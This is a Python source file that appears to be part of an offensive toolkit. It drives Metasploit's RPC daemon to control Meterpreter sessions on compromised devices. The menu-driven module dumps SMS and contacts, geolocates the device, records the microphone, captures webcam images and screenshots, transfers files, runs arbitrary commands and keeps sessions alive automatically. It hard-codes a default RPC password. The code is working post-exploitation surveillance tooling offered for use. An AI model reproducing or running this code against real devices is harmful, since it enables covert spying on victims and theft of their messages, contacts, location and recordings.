"""
Session Manager — connects to Metasploit's MSGRPC daemon to manage
Meterpreter sessions: auto-fetch, keepalive, commands, bulk ops.
"""

import time
import threading
from typing import Optional
from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.table import Table
from rich.live import Live
from core.utils import log_event

console = Console()

try:
    from pymetasploit3.msfrpc import MsfRpcClient
    MSF_AVAILABLE = True
except ImportError:
    MSF_AVAILABLE = False

_client: Optional[object] = None
_keepalive_threads: dict[int, threading.Thread] = {}
_stop_flags: dict[int, threading.Event] = {}


def check_msf_rpc():
    if not MSF_AVAILABLE:
        console.print("[red]✘ pymetasploit3 not installed.[/]  Run: pip install pymetasploit3")
        return False
    return True


def connect(host: str = "127.0.0.1", port: int = 55553, password: str = "msf123") -> bool:
    global _client
    if not check_msf_rpc():
        return False
    try:
        with console.status("[yellow]Connecting to Metasploit RPC...[/]"):
            _client = MsfRpcClient(password, server=host, port=port, ssl=False)
        console.print(f"[green]✔ Connected to Metasploit RPC[/] {host}:{port}")
        log_event(f"Connected to msfrpc {host}:{port}")
        return True
    except Exception as e:
        console.print(f"[red]✘ RPC connection failed:[/] {e}")
        return False


def disconnect():
    global _client
    stop_all_keepalives()
    _client = None
    console.print("[yellow]Disconnected from Metasploit RPC.[/]")


def ensure_connected() -> bool:
    if _client is None:
        console.print("[red]✘ Not connected to Metasploit RPC. Use 'Connect' first.[/]")
        return False
    return True


def list_sessions() -> dict:
    if not ensure_connected():
        return {}
    try:
        return _client.sessions.list
    except Exception as e:
        console.print(f"[red]RPC error:[/] {e}")
        return {}


def show_sessions():
    sessions = list_sessions()
    if not sessions:
        console.print("[yellow]No active sessions.[/]")
        return

    t = Table(title="[bold cyan]Active Sessions[/]", show_lines=True)
    t.add_column("ID",           style="yellow")
    t.add_column("Type",         style="cyan")
    t.add_column("Info",         style="white")
    t.add_column("Via Payload",  style="dim")
    t.add_column("Tunnel",       style="green")
    t.add_column("Platform",     style="magenta")

    for sid, s in sessions.items():
        t.add_row(
            str(sid),
            s.get("type", ""),
            s.get("info", ""),
            s.get("via_payload", ""),
            s.get("tunnel_local", ""),
            s.get("platform", ""),
        )
    console.print(t)


def run_command(session_id: int, cmd: str, timeout: int = 10) -> str:
    if not ensure_connected():
        return ""
    try:
        sess = _client.sessions.session(session_id)
        sess.write(cmd + "\n")
        time.sleep(1.5)
        output = sess.read()
        return output or ""
    except Exception as e:
        return f"Error: {e}"


def run_meterpreter(session_id: int, cmd: str) -> str:
    if not ensure_connected():
        return ""
    try:
        sess = _client.sessions.session(session_id)
        result = sess.run_with_output(cmd, timeout=30)
        return result or ""
    except Exception as e:
        return f"Error: {e}"


def _keepalive_worker(session_id: int, interval: int, stop_event: threading.Event):
    """Send a keepalive command periodically to maintain session."""
    while not stop_event.is_set():
        sessions = list_sessions()
        if str(session_id) not in [str(k) for k in sessions]:
            console.print(f"[red]Session {session_id} lost.[/]")
            break
        run_meterpreter(session_id, "getuid")
        log_event(f"Keepalive sent to session {session_id}")
        stop_event.wait(interval)


def start_keepalive(session_id: int, interval: int = 60):
    if session_id in _keepalive_threads and _keepalive_threads[session_id].is_alive():
        console.print(f"[yellow]Keepalive already running for session {session_id}.[/]")
        return

    stop_ev = threading.Event()
    _stop_flags[session_id] = stop_ev
    t = threading.Thread(
        target=_keepalive_worker,
        args=(session_id, interval, stop_ev),
        daemon=True,
    )
    t.start()
    _keepalive_threads[session_id] = t
    console.print(f"[green]✔ Keepalive started[/] for session {session_id} every {interval}s")


def stop_keepalive(session_id: int):
    if session_id in _stop_flags:
        _stop_flags[session_id].set()
        console.print(f"[yellow]Keepalive stopped for session {session_id}.[/]")


def stop_all_keepalives():
    for sid in list(_stop_flags):
        _stop_flags[sid].set()
    console.print("[yellow]All keepalives stopped.[/]")


def auto_session_fetch(interval: int = 5, duration: int = 300):
    """
    Poll for new sessions every `interval` seconds for `duration` seconds.
    Automatically starts keepalive on each new session found.
    """
    if not ensure_connected():
        return

    seen: set = set(list_sessions().keys())
    console.print(f"[cyan]Auto-fetch active:[/] polling every {interval}s for {duration}s  (Ctrl+C to stop)")
    deadline = time.time() + duration

    try:
        while time.time() < deadline:
            current = set(list_sessions().keys())
            new     = current - seen
            for sid in new:
                sid_int = int(sid)
                console.print(f"[bold green]★ New session opened:[/] ID={sid_int}")
                log_event(f"New session: {sid_int}")
                start_keepalive(sid_int, interval=60)
                seen.add(sid)
            time.sleep(interval)
    except KeyboardInterrupt:
        console.print("\n[yellow]Auto-fetch stopped.[/]")


def device_info(session_id: int):
    cmds = {
        "UID":        "getuid",
        "System":     "sysinfo",
        "Network":    "ifconfig",
        "Processes":  "ps",
    }
    console.rule(f"[bold cyan]Device Info — Session {session_id}[/]")
    for label, cmd in cmds.items():
        out = run_meterpreter(session_id, cmd)
        console.print(f"\n[bold yellow]{label}[/]\n{out}")


def screenshot(session_id: int) -> Optional[str]:
    out = run_meterpreter(session_id, "screenshot")
    if "Saved to" in out:
        path = out.split("Saved to")[-1].strip()
        console.print(f"[green]✔ Screenshot saved:[/] {path}")
        return path
    console.print(f"[yellow]{out}[/]")
    return None


def download_file(session_id: int, remote_path: str, local_path: str):
    out = run_meterpreter(session_id, f"download {remote_path} {local_path}")
    console.print(out)


def upload_file(session_id: int, local_path: str, remote_path: str):
    out = run_meterpreter(session_id, f"upload {local_path} {remote_path}")
    console.print(out)


def dump_sms(session_id: int):
    out = run_meterpreter(session_id, "dump_sms")
    console.print(out)


def dump_contacts(session_id: int):
    out = run_meterpreter(session_id, "dump_contacts")
    console.print(out)


def get_location(session_id: int):
    out = run_meterpreter(session_id, "geolocate")
    console.print(out)


def record_mic(session_id: int, duration: int = 10):
    out = run_meterpreter(session_id, f"record_mic -d {duration}")
    console.print(out)


def webcam_snap(session_id: int):
    out = run_meterpreter(session_id, "webcam_snap")
    console.print(out)


def interactive_sessions():
    console.rule("[bold red]Session Manager[/]")

    if not MSF_AVAILABLE:
        console.print("[red]✘ pymetasploit3 not installed.[/]")
        return

    if _client is None:
        host  = Prompt.ask("Metasploit RPC host", default="127.0.0.1")
        port  = IntPrompt.ask("RPC port", default=55553)
        passw = Prompt.ask("RPC password", default="msf123", password=True)
        if not connect(host, port, passw):
            return

    while True:
        menu = {
            "1":  "List sessions",
            "2":  "Run Meterpreter command",
            "3":  "Device info",
            "4":  "Screenshot",
            "5":  "Dump SMS",
            "6":  "Dump contacts",
            "7":  "Get GPS location",
            "8":  "Record microphone",
            "9":  "Webcam snapshot",
            "10": "Download file",
            "11": "Upload file",
            "12": "Start keepalive",
            "13": "Stop keepalive",
            "14": "Auto session fetch",
            "15": "Disconnect & back",
        }

        from rich.table import Table
        m = Table(show_header=False, box=None)
        for k, v in menu.items():
            m.add_row(f"[yellow][{k:>2}][/]", v)
        console.print(m)

        choice = Prompt.ask("Select", choices=list(menu.keys()), default="15")

        if choice == "1":
            show_sessions()

        elif choice in ("2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13"):
            show_sessions()
            sid = IntPrompt.ask("Session ID")

            if choice == "2":
                cmd = Prompt.ask("Command")
                console.print(run_meterpreter(sid, cmd))
            elif choice == "3":
                device_info(sid)
            elif choice == "4":
                screenshot(sid)
            elif choice == "5":
                dump_sms(sid)
            elif choice == "6":
                dump_contacts(sid)
            elif choice == "7":
                get_location(sid)
            elif choice == "8":
                dur = IntPrompt.ask("Duration (seconds)", default=10)
                record_mic(sid, dur)
            elif choice == "9":
                webcam_snap(sid)
            elif choice == "10":
                rp = Prompt.ask("Remote path")
                lp = Prompt.ask("Local save path")
                download_file(sid, rp, lp)
            elif choice == "11":
                lp = Prompt.ask("Local file path")
                rp = Prompt.ask("Remote path")
                upload_file(sid, lp, rp)
            elif choice == "12":
                iv = IntPrompt.ask("Keepalive interval (seconds)", default=60)
                start_keepalive(sid, iv)
            elif choice == "13":
                stop_keepalive(sid)

        elif choice == "14":
            iv  = IntPrompt.ask("Poll interval (seconds)", default=5)
            dur = IntPrompt.ask("Watch duration (seconds)", default=300)
            auto_session_fetch(iv, dur)

        elif choice == "15":
            disconnect()
            break
